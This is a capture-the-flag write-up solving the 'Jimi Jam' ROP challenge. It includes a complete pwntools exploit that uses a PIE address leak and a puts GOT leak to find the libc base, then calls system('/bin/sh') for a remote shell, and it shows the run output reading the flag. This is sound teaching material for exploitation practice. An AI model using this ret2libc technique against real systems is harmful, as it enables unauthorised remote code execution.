# Jimi Jam

## Task

I'm stuck in Jimi Jam jail

:( Can you let me out?

nc challenges.2020.squarectf.com 9000

File: jimi-jam.zip

Tags: binary exploitation, rop

## Solution

Inside the zip is a binary and a libc:

```bash
$ file jimi-jam libc.so.6
jimi-jam:  ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a0d192104ba33bfc1018faf46131a0ee7b51faa2, for GNU/Linux 3.2.0, not stripped
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f3ff3fda80b817c464a56eed59ff09dc864eaeb0, for GNU/Linux 3.2.0, stripped
$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

Let's take a look at main:

```nasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x000000000000129a <+0>:     endbr64
   0x000000000000129e <+4>:     push   rbp
   0x000000000000129f <+5>:     mov    rbp,rsp
   0x00000000000012a2 <+8>:     mov    rax,QWORD PTR [rip+0x2d77]        # 0x4020 <stdout@@GLIBC_2.2.5>
   0x00000000000012a9 <+15>:    mov    ecx,0x0
   0x00000000000012ae <+20>:    mov    edx,0x2
   0x00000000000012b3 <+25>:    mov    esi,0x0
   0x00000000000012b8 <+30>:    mov    rdi,rax
   0x00000000000012bb <+33>:    call   0x10f0 <setvbuf@plt>
   0x00000000000012c0 <+38>:    mov    rax,QWORD PTR [rip+0x2d69]        # 0x4030 <stdin@@GLIBC_2.2.5>
   0x00000000000012c7 <+45>:    mov    ecx,0x0
   0x00000000000012cc <+50>:    mov    edx,0x2
   0x00000000000012d1 <+55>:    mov    esi,0x0
   0x00000000000012d6 <+60>:    mov    rdi,rax
   0x00000000000012d9 <+63>:    call   0x10f0 <setvbuf@plt>
   0x00000000000012de <+68>:    mov    rax,QWORD PTR [rip+0x2d5b]        # 0x4040 <stderr@@GLIBC_2.2.5>
   0x00000000000012e5 <+75>:    mov    ecx,0x0
   0x00000000000012ea <+80>:    mov    edx,0x2
   0x00000000000012ef <+85>:    mov    esi,0x0
   0x00000000000012f4 <+90>:    mov    rdi,rax
   0x00000000000012f7 <+93>:    call   0x10f0 <setvbuf@plt>
   0x00000000000012fc <+98>:    mov    eax,0x0
   0x0000000000001301 <+103>:   call   0x1209 <init_jail>
   0x0000000000001306 <+108>:   lea    rdi,[rip+0xd23]        # 0x2030
   0x000000000000130d <+115>:   call   0x10b0 <puts@plt>
   0x0000000000001312 <+120>:   lea    rsi,[rip+0x2d47]        # 0x4060 <ROPJAIL>
   0x0000000000001319 <+127>:   lea    rdi,[rip+0xd50]        # 0x2070
   0x0000000000001320 <+134>:   mov    eax,0x0
   0x0000000000001325 <+139>:   call   0x10c0 <printf@plt>
   0x000000000000132a <+144>:   mov    eax,0x0
   0x000000000000132f <+149>:   call   0x1269 <vuln>
   0x0000000000001334 <+154>:   mov    eax,0x0
   0x0000000000001339 <+159>:   pop    rbp
   0x000000000000133a <+160>:   ret    
End of assembler dump.
```

It looks like `printf` at `main+139` leaks us an address.

Connecting to the server:

```bash
$ nc challenges.2020.squarectf.com 9000
Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!
The tour center is right here! 0x5575a2c5b060
Hey there! Youre now in JIMI JAM JAIL
```

We can use the leak of the `ROPJAIL` object from the binary to calculate it's base address and offset our ROP-gadgets accordingly. Then we can leak a libc address to get our shell.

We just need to find out the correct offset for our input. We can do that with `pattern create 2000 pattern.txt` and `run < pattern.txt` in gdb with peda.

If you experience issue while trying to pwn, you can use `gdb.attach(p, gdbscript="b *vuln")` together with your own libc: `$ gcc --print-file-name=libc.so.6`.

```python
from pwn import *
import struct

elf = ELF("./jimi-jam", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(elf)

p = remote("challenges.2020.squarectf.com", 9000)

info(p.recvline())
info(p.recvuntil("The tour center is right here! "))
addr = p.recvline() # addr leak
info(p.recvline())

elf.address = int(addr, 16) - 0x4060 # base addr

POP_RDI = elf.address + rop.find_gadget(['pop rdi', 'ret'])[0]
PUTS_GOT = elf.got['puts']
PUTS_PLT = elf.address + 0x10b0 # offset in binary
MAIN = elf.symbols['main']

info("pop rdi;ret: %s" % hex(POP_RDI))
info("puts@got: %s" % hex(PUTS_GOT))
info("puts@plt: %s" % hex(PUTS_PLT))
info("main: %s" % hex(MAIN))

payload  = "A"*16 # buffer padding
payload += p64(POP_RDI)
payload += p64(PUTS_GOT)
payload += p64(PUTS_PLT)
payload += p64(MAIN)
# after leaking libc, return to main for another payload

p.sendline(payload)

leak = p.recvline()[:-1]
leak_real = struct.unpack("<Q", leak.ljust(8, "\x00"))[0]

libc.address = leak_real - libc.sym["puts"]
info("libc puts: %s" % hex(leak_real))
info("libc base: %s" % hex(libc.address))

BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]
RET = elf.address + rop.find_gadget(['ret'])[0]

info(p.recvline())
info(p.recvline())
info(p.recvline())

info("bin/sh: %s" % hex(BINSH))
info("system: %s" % hex(SYSTEM))
info("ret gadget: %s" % hex(RET))

payload  = 'A'*16
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(BINSH)
payload += p64(SYSTEM)

p.sendline(payload)
p.interactive()
```

Running it:

```bash
$ python2 rop.py
[*] Loaded 14 cached gadgets for './jimi-jam'
[+] Opening connection to challenges.2020.squarectf.com on port 9000: Done
[*] Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!
[*] The tour center is right here!
[*] Hey there! Youre now in JIMI JAM JAIL
[*] pop rdi;ret: 0x5575a2c583a3
[*] puts@got: 0x5575a2c5afa0
[*] puts@plt: 0x5575a2c580b0
[*] main: 0x5575a2c5829a
[*] libc puts: 0x7f156ca685a0
[*] libc base: 0x7f156c9e1000
[*] Hey there jimi jammer! Welcome to the jimmi jammiest jammerino!
[*] The tour center is right here! 0x5575a2c5b060
[*] Hey there! Youre now in JIMI JAM JAIL
[*] bin/sh: 0x7f156cb985aa
[*] system: 0x7f156ca36410
[*] ret gadget: 0x5575a2c5801a
[*] Switching to interactive mode
$ ls
flag.txt
jimi-jam
$ cat flag.txt
flag{do_you_like_ropping}
```
